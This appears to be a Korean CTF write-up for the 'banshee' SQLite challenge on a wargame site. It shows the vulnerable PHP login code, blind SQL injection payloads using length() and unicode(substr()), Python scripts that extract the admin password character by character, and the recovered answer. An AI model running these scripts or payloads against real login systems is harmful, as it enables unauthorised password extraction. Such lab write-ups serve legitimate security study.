# banshee

## 1. Code
```php
<?php
  include "./config.php";
  login_chk();
  $db = sqlite_open("./db/banshee.db");
  if(preg_match('/sqlite|member|_/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from member where id='admin' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['id']) echo "<h2>login success!</h2>";

  $query = "select pw from member where id='admin'"; 
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['pw'] === $_GET['pw']) solve("banshee"); 
  highlight_file(__FILE__);
?>
```

## 2. Condition
- `sqlite member _`를 필터링 한다.   
- 1차적으로 get 파라미터 pw를 통해 로그인 가능 여부를 확인한다.   
- 2차적으로 get 파라미터 pw와 실제 admin pw와 비교하여 동일할 시 문제가 해결된다.   

## 3. Solution
python 스크립트를 이용해 blind-sqlinjection 한다.

a. pw의 길이
b. pw의 값


### a. Length of pw
변수명 | 값
---|---:
`pw` | ' or id='admin' and length(pw)=`i`-- 


비교값 `i`는 반복문을 통해 적당값(ex. 1~20)을 넣어준다.

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php?\
            pw=' or id='admin' and length(pw)=%d-- " % i
    res = requests.get(url, cookies=cookie)
    
    if "login success!" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break
```

스크립트 결과는 다음과 같다.
```
Length of pw : 8
```
---


### b. Value of pw

변수명 | 값
---|---:
`no` | ' or id='admin' and unicode(substr(pw,`i`,1))=`j`--    


sqlite에서는 `ascii`함수 대신 `unicode`를 이용하면 된다.   

a. Length of pw 의 코드에 추가해 보자.

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php?\
            pw=' or id='admin' and length(pw)=%d-- " % i
    res = requests.get(url, cookies=cookie)
    
    if "login success!" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break
        
pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php?\
            pw=' or id='admin' and unicode(substr(pw,%d,1))=%d-- " % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "login success!" in res.text:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break
```

스크립트 결과는 다음과 같다.
```
Length of pw : 8
pw(1) : 0
pw(2) : 03
pw(3) : 031
pw(4) : 0313
pw(5) : 03130
pw(6) : 031309
pw(7) : 0313091
pw(8) : 0313091b
```
---



나온 pw 값을 최종적으로 대입해 보면 문제가 해결된다.

변수명 | 값
---|---:
`pw` | 0313091b